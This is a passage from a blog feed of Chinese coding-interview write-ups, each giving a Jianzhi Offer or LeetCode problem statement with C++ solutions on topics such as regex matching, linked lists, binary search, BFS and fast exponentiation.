<pre class="line-numbers language-none"><code class="language-none">请实现一个函数用来匹配包括&#39;.&#39;和&#39;*&#39;的正则表达式。

模式中的字符&#39;.&#39;表示任意一个字符，而&#39;*&#39;表示它前面的字符可以出现任意次（含0次）。

在本题中，匹配是指字符串的所有字符匹配整个模式。

例如，字符串&quot;aaa&quot;与模式&quot;a.a&quot;和&quot;ab*ac*a&quot;匹配，但是与&quot;aa.a&quot;和&quot;ab*a&quot;均不匹配。

样例
输入：

s&#x3D;&quot;aa&quot;
p&#x3D;&quot;a*&quot;

输出:true
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
	int n,m;
	vector&lt;vector&lt;int&gt; &gt;f;
	string s,p;
    bool isMatch(string _s, string _p) 
    &#123;
        s&#x3D;_s;
        p&#x3D;_p;
        n&#x3D;s.size();
        m&#x3D;p.size();
        f&#x3D;vector&lt;vector&lt;int&gt; &gt;(n+1,vector&lt;int&gt;(m+1,-1));
        return dp(0,0);
    &#125;
    bool dp(int x,int y)
    &#123;
    	if(f[x][y]!&#x3D;-1)
    		return f[x][y];
    	if(y&#x3D;&#x3D;m)
    		return f[x][y]&#x3D;x&#x3D;&#x3D;n;
    	bool first_match&#x3D;	x&lt;n &amp;&amp;(p[y]&#x3D;&#x3D;&#39;.&#39;||s[x]&#x3D;&#x3D;p[y]);
    	if(y+1&lt;m &amp;&amp; p[y+1]&#x3D;&#x3D;&#39;*&#39;)
    		f[x][y]&#x3D;dp(x,y+2)||dp(x+1,y);
    	else 
    		f[x][y]&#x3D;first_match	&amp;&amp;	dp(x+1,y+1);
    	return f[x][y];
    &#125;
    
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 16.删除链表中重复的节点</title>
    <url>/2021/03/19/%E5%89%91%E6%8C%87OFFER-16/</url>
    <content><![CDATA[<p>16.删除链表中重复的节点</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留。

样例1
输入：1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5

输出：1-&gt;2-&gt;5
样例2
输入：1-&gt;1-&gt;1-&gt;2-&gt;3

输出：2-&gt;3
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">&#x2F;**
 * Definition for singly-linked list.
 * struct ListNode &#123;
 *     int val;
 *     ListNode *next;
 *     ListNode(int x) : val(x), next(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    ListNode* deleteDuplication(ListNode* head) 
    &#123;
     	auto _head&#x3D;new ListNode(-1);
     	_head-&gt;next&#x3D;head;
     	auto p&#x3D;_head;
     	while(p-&gt;next)
     	&#123;
     		auto q&#x3D;p-&gt;next;
     		while(q&amp;&amp;p-&gt;next-&gt;val&#x3D;&#x3D;q-&gt;val)
     			q&#x3D;q-&gt;next;
     		if(p-&gt;next-&gt;next&#x3D;&#x3D;q)
     			p&#x3D;p-&gt;next;
     		else p-&gt;next&#x3D;q;

     	&#125;
     	return _head-&gt;next;



    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 15. 在O(1)时间删除链表结点</title>
    <url>/2021/03/19/%E5%89%91%E6%8C%87OFFER-15-%E5%9C%A8O-1-%E6%97%B6%E9%97%B4%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%BB%93%E7%82%B9/</url>
    <content><![CDATA[<ol start="15">
<li>在O(1)时间删除链表结点<a id="more"></a>

</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">
给定单向链表的一个节点指针，定义一个函数在O(1)时间删除该结点。

假设链表一定存在，并且该节点一定不是尾节点。

样例
输入：链表 1-&gt;4-&gt;6-&gt;8
      删掉节点：第2个节点即6（头节点为第0个节点）

输出：新链表 1-&gt;4-&gt;8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">
&#x2F;**
 * Definition for singly-linked list.
 * struct ListNode &#123;
 *     int val;
 *     ListNode *next;
 *     ListNode(int x) : val(x), next(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    void deleteNode(ListNode* node) 
    &#123;
        node-&gt;val&#x3D;node-&gt;next-&gt;val;
        node-&gt;next&#x3D;node-&gt;next-&gt;next;
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 14.数值的整数次方</title>
    <url>/2021/03/19/%E5%89%91%E6%8C%87OFFER-14-%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9/</url>
    <content><![CDATA[<p>数值的整数次方</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">
实现函数double Power(double base, int exponent)，求base的 exponent次方。

不得使用库函数，同时不需要考虑大数问题。

只要输出结果与答案的绝对误差不超过 10−2 即视为正确。

注意：

不会出现底数和指数同为0的情况
当底数为0时，指数一定为正
样例1
输入：10 ，2

输出：100
样例2
输入：10 ，-2  

输出：0.01
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<ul>
<li>完美解法，普通的幂的运算，速度太慢，无法通过，这一题运用了二进制的运算思想<br>你比如说，3的10次方<br>10==10010</li>
</ul>
<p>1.首先判断最末尾是否为1，如果不为1，<br>则，x=3<em>3，记录x<br>10010整体右移一位<br>则为01001<br>2.继续判断最末尾是否为1，<br>为一,则最终的结果</em>x</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">
class Solution &#123;
public:
    double Power(double x, int n) &#123;
        typedef long long LL;
        bool is_minus&#x3D; n&lt;0;
        double res&#x3D;1;
        for(LL k&#x3D;abs(LL(n));k;k&gt;&gt;&#x3D;1)
        &#123;
            if(k&amp;1)
                res*&#x3D;x;
                x*&#x3D;x;
        &#125;
        if(is_minus) res&#x3D;1&#x2F;res;
        return res;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    double Power(double x, int n) &#123;
        double res&#x3D;1;
        for(long long k&#x3D;abs((long long) (n));k;k&gt;&gt;&#x3D;1)
        &#123;
            if(k&amp;1)
                res*&#x3D;x;
                x*&#x3D;x;
        &#125;
        if(n&lt;0) res&#x3D;1&#x2F;res;
        return res;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    double Power(double x, int n) 
    &#123;
        double res&#x3D;1;
        for(long long i&#x3D;abs((long long)n);i;i&gt;&gt;&#x3D;1)
        &#123;
        	if(i&amp;1)
        		res*&#x3D;x;
        	x*&#x3D;x;
        &#125;
        return n&lt;0?1&#x2F;res:res;
        
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 13.二进制中1的个数</title>
    <url>/2021/03/18/%E5%89%91%E6%8C%87OFFER-13-%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
    <content><![CDATA[<p>二进制中1的个数</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">输入一个 32 位整数，输出该数二进制表示中 1 的个数。

注意：

负数在计算机中用其绝对值的补码来表示。
样例1
输入：9
输出：2
解释：9的二进制表示是1001，一共有2个1。
样例2
输入：-2
输出：31
解释：-2在计算机里会被表示成11111111111111111111111111111110，
      一共有31个1。
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    int NumberOf1(int _n) &#123;
        unsigned int n&#x3D;_n;
        int s&#x3D;0;
        while(n) s+&#x3D;n&amp;1,n&gt;&gt;&#x3D;1;
        return s;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 12.剪绳子</title>
    <url>/2021/03/18/%E5%89%91%E6%8C%87OFFER-12-%E5%89%AA%E7%BB%B3%E5%AD%90/</url>
    <content><![CDATA[<p>12.剪绳子</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">给你一根长度为 n 绳子，请把绳子剪成 m 段（m、n 都是整数，2≤n≤58 并且 m≥2）。

每段的绳子的长度记为 k[1]、k[2]、……、k[m]。

k[1]k[2]…k[m] 可能的最大乘积是多少？

例如当绳子的长度是 8 时，我们把它剪成长度分别为 2、3、3 的三段，此时得到最大的乘积 18。

样例
输入：8

输出：18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    int maxProductAfterCutting(int n) 
    &#123;
    	int s&#x3D;1;
    	if(n&lt;&#x3D;3) return 1*(n-1);
    	if(n%3&#x3D;&#x3D;1)  s&#x3D;4,n-&#x3D;4;
    	else if(n%3&#x3D;&#x3D;2) s&#x3D;2,n-&#x3D;2;
    	while(n) s*&#x3D;3,n-&#x3D;3;
    	return s;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>LeetCode 507. 完美数</title>
    <url>/2021/03/16/LeetCode-507-%E5%AE%8C%E7%BE%8E%E6%95%B0/</url>
    <content><![CDATA[<ol start="507">
<li>完美数<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">对于一个 正整数，如果它和除了它自身以外的所有 正因子 之和相等，我们称它为 「完美数」。

给定一个 整数 n， 如果是完美数，返回 true，否则返回 false

 

示例 1：

输入：28
输出：True
解释：28 &#x3D; 1 + 2 + 4 + 7 + 14
1, 2, 4, 7, 和 14 是 28 的所有正因子。
示例 2：

输入：num &#x3D; 6
输出：true
示例 3：

输入：num &#x3D; 496
输出：true
示例 4：

输入：num &#x3D; 8128
输出：true
示例 5：

输入：num &#x3D; 2
输出：false
 

提示：

1 &lt;&#x3D; num &lt;&#x3D; 108

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">最佳算法
class Solution &#123;
public:
    bool checkPerfectNumber(int num) &#123;
switch(num) &#123;
            case 6:
            case 28:
            case 496:
            case 8128:
            case 33550336:
                return true;
        &#125;
        return false;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">最常规，最周密的解法
class Solution &#123;
public:
    bool checkPerfectNumber(int num) &#123;
        if(num&lt;3)
            return false;
        int s&#x3D;1;
        int i吗;
        for(i&#x3D;2;i*i&lt;num;i++)
        &#123;
            if(num%i&#x3D;&#x3D;0)
                s&#x3D;s+i+num&#x2F;i;
        &#125;
        if(i*i&#x3D;&#x3D;num)
            s&#x3D;s+i;
        return s&#x3D;&#x3D;num;

    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">因为目前我只发现5个完美数，所以不用考虑 i*i&#x3D;&#x3D;num的情况
class Solution &#123;
public:
    bool checkPerfectNumber(int num) &#123;
if (num &#x3D;&#x3D; 1) &#123;
            return false;
        &#125;

        int sum &#x3D; 1;

        for (int i &#x3D; 2; i &lt; sqrt(num); i++) &#123;
            if (num % i &#x3D;&#x3D; 0) &#123;
                sum +&#x3D; i;
                sum +&#x3D; num &#x2F; i;
            &#125;
        &#125;

        return sum &#x3D;&#x3D; num;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>剑指offer 12.机器人的运动范围</title>
    <url>/2021/03/16/12-%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4/</url>
    <content><![CDATA[<p>机器人的运动范围</p>
<a id="more"></a>

<pre class="line-numbers language-none"><code class="language-none">地上有一个 m 行和 n 列的方格，横纵坐标范围分别是 0∼m−1 和 0∼n−1。

一个机器人从坐标 (0,0) 的格子开始移动，每一次只能向左，右，上，下四个方向移动一格。

但是不能进入行坐标和列坐标的数位之和大于 k 的格子。

请问该机器人能够达到多少个格子？

样例1
输入：k&#x3D;7, m&#x3D;4, n&#x3D;5

输出：20
样例2
输入：k&#x3D;18, m&#x3D;40, n&#x3D;40

输出：1484

解释：当k为18时，机器人能够进入方格（35,37），因为3+5+3+7 &#x3D; 18。
      但是，它不能进入方格（35,38），因为3+5+3+8 &#x3D; 19。
注意:

0&lt;&#x3D;m&lt;&#x3D;50
0&lt;&#x3D;n&lt;&#x3D;50
0&lt;&#x3D;k&lt;&#x3D;100
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
	int get_simple_sum(int n)
	&#123;
		int s&#x3D;0;
		while(n)
		&#123;
			s+&#x3D;n%10;
			n&#x2F;&#x3D;10;
		&#125;
		return s;
	&#125;
	int get_sum(pair&lt;int,int&gt; p)
	&#123;
		return get_simple_sum(p.first)+get_simple_sum(p.second);
	&#125;
    int movingCount(int threshold, int rows, int cols)
    &#123;
    	int res&#x3D;0;
    	if(!rows||!cols)
        	return 0;
    	vector&lt; vector&lt;bool&gt; &gt; st(rows,vector&lt;bool&gt;(cols));
    	queue&lt;pair&lt;int,int&gt; &gt; q;
    	q.push(&#123;0,0&#125;);
    	int dx[4]&#x3D;&#123;0,1,0,-1&#125;;
    	int dy[4]&#x3D;&#123;-1,0,1,0&#125;;
    	while(q.size())
    	&#123;
    		auto t&#x3D;q.front();
    		q.pop();
    		if(get_sum(t)&gt;threshold||st[t.first][t.second])
    			continue;
    		res++;
    		st[t.first][t.second]&#x3D;true;
    		for(int i&#x3D;0;i&lt;4;i++)
    		&#123;
    			int a&#x3D;t.first+dx[i];
    			int b&#x3D;t.second+dy[i];
    			if(a&gt;&#x3D;0 &amp;&amp;a&lt;rows &amp;&amp; b&gt;&#x3D;0 &amp;&amp;b&lt;cols)
    				q.push(&#123;a,b&#125;);
    		&#125;

    	&#125;
    	return res;
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>LeedCode 231. 2的幂</title>
    <url>/2021/03/14/LeetCode-231-2%E7%9A%84%E5%B9%82/</url>
    <content><![CDATA[<p>2的幂</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">给定一个整数，编写一个函数来判断它是否是 2 的幂次方。

示例 1:

输入: 1
输出: true
解释: 20 &#x3D; 1
示例 2:

输入: 16
输出: true
解释: 24 &#x3D; 16
示例 3:

输入: 218
输出: false

来源：力扣（LeetCode）

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>链接：<a href="https://leetcode-cn.com/problems/power-of-two">https://leetcode-cn.com/problems/power-of-two</a></p>
<pre class="line-numbers language-none"><code class="language-none">1.
class Solution &#123;
public:
    bool isPowerOfTwo(int n) &#123;
        return (n&gt;0)&amp;&amp;(n&amp;-n)&#x3D;&#x3D;n;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>n&amp;-n<br>n=      10100100<br>-n=     01011100<br>n&amp;-n=   00000100<br>算出从右边数第一个1</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">2.
class Solution &#123;
public:
    bool isPowerOfTwo(int n) &#123;
        return n&gt;0&amp;&amp;(1&lt;&lt;30)%n&#x3D;&#x3D;0;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 11.矩阵中的路径</title>
    <url>/2021/03/12/%E5%89%91%E6%8C%87OFFER-11-%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/</url>
    <content><![CDATA[<p>矩阵中的路径</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。

路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。

如果一条路径经过了矩阵中的某一个格子，则之后不能再次进入这个格子。

注意：

输入的路径不为空；
所有出现的字符均为大写英文字母；
样例
matrix&#x3D;
[
  [&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;E&quot;],
  [&quot;S&quot;,&quot;F&quot;,&quot;C&quot;,&quot;S&quot;],
  [&quot;A&quot;,&quot;D&quot;,&quot;E&quot;,&quot;E&quot;]
]

str&#x3D;&quot;BCCE&quot; , return &quot;true&quot; 

str&#x3D;&quot;ASAE&quot; , return &quot;false&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">class Solution
&#123;
public:
    bool hasPath(vector&lt;vector&lt;char&gt;&gt; &amp;matrix, string &amp;str)
    &#123;
        for (int i &#x3D; 0; i &lt; matrix.size(); i++)
            for (int j &#x3D; 0; j &lt; matrix[i].size(); j++)
                if (dfs(matrix, str, 0, i, j))
                    return true;
        return false;
    &#125;
    bool dfs(vector&lt;vector&lt;char&gt;&gt; &amp;matrix, string &amp;str, int u, int x, int y)
    &#123;
        if (matrix[x][y] !&#x3D; str[u])
            return false;
        if (u &#x3D;&#x3D; str.size() - 1)
            return true;
        int dx[4] &#x3D; &#123;-1, 0, 1, 0&#125;;
        int dy[4] &#x3D; &#123;0, 1, 0, -1&#125;;
        char t &#x3D; matrix[x][y];
        matrix[x][y] &#x3D; &#39;*&#39;;
        for (int i &#x3D; 0; i &lt; 4; i++)
        &#123;
            int a &#x3D; x + dx[i], b &#x3D; y + dy[i];
            if (a &gt;&#x3D; 0 &amp;&amp; a &lt; matrix.size() &amp;&amp; b &gt;&#x3D; 0 &amp;&amp; b &lt; matrix[a].size())
            &#123;
                if (dfs(matrix, str, u + 1, a, b))
                    return true;
            &#125;
        &#125;
        matrix[x][y] &#x3D; t;
        return false;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 10.旋转数组的最小数字</title>
    <url>/2021/03/12/%E5%89%91%E6%8C%87OFFER-10-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<p>旋转数组的最小数字</p>
<a id="more"></a>






<pre class="line-numbers language-none"><code class="language-none">
把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。

输入一个升序的数组的一个旋转，输出旋转数组的最小元素。

例如数组 &#123;3,4,5,1,2&#125; 为 &#123;1,2,3,4,5&#125; 的一个旋转，该数组的最小值为 1。

数组可能包含重复项。

注意：数组内所含元素非负，若数组大小为 0，请返回 −1。

样例
输入：nums&#x3D;[2,2,2,0,1]

输出：0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    int findMin(vector&lt;int&gt;&amp; nums) 
    &#123;
        int n&#x3D;nums.size()-1;
        if(n&lt;0) return -1;
        while(n&gt;0&amp;&amp;nums[0]&#x3D;&#x3D;nums[n])
        	n--;
        if(nums[n]&gt;&#x3D;nums[0]) return nums[0];
        int l&#x3D;0,r&#x3D;n;
        while(l&lt;r)
        &#123;
        	int mid&#x3D;r+l&gt;&gt;1;
        	if(nums[mid]&lt;nums[0])
        		r&#x3D;mid;
        	else l&#x3D;mid+1;

        &#125;
        return nums[r];
    &#125;
&#125;;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    int findMin(vector&lt;int&gt;&amp; nums) 
    &#123;
        int n&#x3D;nums.size()-1;
        if(n&lt;0)
            return -1;
        while(n&gt;0&amp;&amp;nums[0]&#x3D;&#x3D;nums[n])
            n--;
        if(nums[n]&gt;&#x3D;nums[0])
            return nums[0];
        int l&#x3D;0;
        int r&#x3D;n;
        while(l&lt;r)
        &#123;
            int mid&#x3D;l+r&gt;&gt;1;
            if(nums[0]&lt;&#x3D;nums[mid])
                l&#x3D;mid+1;
            else r&#x3D;mid;
        &#125;
        return nums[r];
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 9.斐波那契数列</title>
    <url>/2021/03/12/%E5%89%91%E6%8C%87OFFER-9-%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97/</url>
    <content><![CDATA[<p>斐波那契数列</p>
<a id="more"></a>




<pre class="line-numbers language-none"><code class="language-none">输入一个整数 n ，求斐波那契数列的第 n 项。

假定从 0 开始，第 0 项为 0。(n≤39)

样例
输入整数 n&#x3D;5 

返回 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    int Fibonacci(int n) 
    &#123;
        int a&#x3D;0,b&#x3D;1;
        while(n--)
        &#123;
            int c&#x3D;a+b;
            a&#x3D;b;
            b&#x3D;c;
        &#125;
        return a;
    &#125;
&#125;;


剑指OFFER 9.斐波那契数列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 8.用两个栈实现队列</title>
    <url>/2021/03/12/%E5%89%91%E6%8C%87OFFER-8-%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<p>剑指OFFER 8.用两个栈实现队列</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">请用栈实现一个队列，支持如下四种操作：

push(x) – 将元素x插到队尾；
pop() – 将队首的元素弹出，并返回该元素；
peek() – 返回队首元素；
empty() – 返回队列是否为空；
注意：

你只能使用栈的标准操作：push to top，peek&#x2F;pop from top, size 和 is empty；
如果你选择的编程语言没有栈的标准库，你可以使用list或者deque等模拟栈的操作；
输入数据保证合法，例如，在队列为空时，不会进行pop或者peek等操作；
样例
MyQueue queue &#x3D; new MyQueue();

queue.push(1);
queue.push(2);
queue.peek();  &#x2F;&#x2F; returns 1
queue.pop();   &#x2F;&#x2F; returns 1
queue.empty(); &#x2F;&#x2F; returns false
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">class MyQueue &#123;
public:
    &#x2F;** Initialize your data structure here. *&#x2F;
    stack&lt;int&gt; a,b;
    MyQueue() &#123;
        
    &#125;
    
    &#x2F;** Push element x to the back of queue. *&#x2F;
    void push(int x) &#123;
        a.push(x);
    &#125;
    
    int copy(stack&lt;int&gt; &amp;a,stack&lt;int&gt; &amp;b)
    &#123;
        while(b.size())
        &#123;
            a.push(b.top());
            b.pop();
        &#125;
    &#125;
    &#x2F;** Removes the element from in front of queue and returns that element. *&#x2F;
    int pop() &#123;
        copy(b,a);
        int n&#x3D;b.top();
        b.pop();
        copy(a,b);
        return n;
    &#125;
    
    &#x2F;** Get the front element. *&#x2F;
    int peek() &#123;
        copy(b,a);
        int n&#x3D;b.top();
        copy(a,b);
        return n;
        
    &#125;
    
    &#x2F;** Returns whether the queue is empty. *&#x2F;
    bool empty() &#123;
        return a.empty();
    &#125;
&#125;;

&#x2F;**
 * Your MyQueue object will be instantiated and called as such:
 * MyQueue obj &#x3D; MyQueue();
 * obj.push(x);
 * int param_2 &#x3D; obj.pop();
 * int param_3 &#x3D; obj.peek();
 * bool param_4 &#x3D; obj.empty();
 *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 7.二叉树的下一个节点</title>
    <url>/2021/03/12/%E5%89%91%E6%8C%87OFFER-7-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<p>二叉树的下一个节点</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">给定一棵二叉树的其中一个节点，请找出中序遍历序列的下一个节点。

注意：

如果给定的节点是中序遍历序列的最后一个，则返回空节点;
二叉树一定不为空，且给定的节点一定不是空节点；
样例
假定二叉树是：[2, 1, 3, null, null, null, null]， 给出的是值等于2的节点。

则应返回值等于3的节点。

解释：该二叉树的结构如下，2的后继节点是3。
  2
